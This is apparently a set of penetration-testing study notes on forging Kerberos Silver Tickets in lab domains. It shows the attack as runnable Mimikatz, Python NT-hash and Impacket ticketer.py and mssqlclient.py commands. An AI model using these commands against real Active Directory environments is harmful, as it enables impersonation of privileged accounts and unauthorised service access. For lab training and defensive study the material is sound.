# Silver Tickets

### Silver Tickets Theory & Basic Example

Forge a Kerberos TGS (service ticket) using the compromised NTLM hash of a service account. The service trusts the ticket without validating with the DC.

**Required info:**

1. **SPN password hash** (dump with Mimikatz if local admin)
2. **Domain SID** (`whoami /user` → omit the user RID)
3. **Target SPN** (`Get-NetUser -SPN | select samaccountname,serviceprincipalname`)

```cmd
# Forge silver ticket and inject into memory (/ptt)
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<service-account-NTLM-hash> /user:jeffadmin
```

```powershell
# Verify injection
klist
# Access the service (force Kerberos)
iwr -Uri http://web04.corp.com/ -UseDefaultCredentials | Select-Object -ExpandProperty Content
```

### Silver Ticket Configuration

```bash
*Evil-WinRM* PS C:\Users\eric.wallows\Documents> whoami /user

USER INFORMATION
----------------

User Name         SID
================= ==============================================
oscp\eric.wallows S-1-5-21-2610934713-1581164095-2706428072-7102
```

Domain SID: `S-1-5-21-2610934713-1581164095-2706428072`

#### NTLM hash creation from user plain-text password

```
python3 -c "import hashlib, binascii; print(binascii.hexlify(hashlib.new('md4', 'Dolphin1'.encode('utf-16-le')).digest()).decode())"
```

NT-Hash for `sql_svc` : `469f1d2796cf71fb9b1a28fe2545ca35`\
Target SPN : `MSSQL/MS02.oscp.exam`

### **Forging a Silver Ticket using ticketer.py**

```python
ticketer.py -nthash 469f1d2796cf71fb9b1a28fe2545ca35 -domain-sid S-1-5-21-2610934713-1581164095-2706428072 -domain oscp.exam -spn MSSQL/MS02.oscp.exam sa
```

The forged ticket is saved locally as `sa.ccache`

```
export KRB5CCNAME=sa.ccache
```

#### Fix /etc/hosts file for resolution

```
10.10.206.146 oscp.exam
10.10.206.248 MS02.oscp.exam
```

**Comment out dns\_proxy in /etc/proxychains4.conf**

`mssqlclient.py -k -no-pass MS02.oscp.exam`

Flags:\
`-k : Use Kerberos Authentication`\
`-no-pass : Don't prompt for password (use the ticket)`
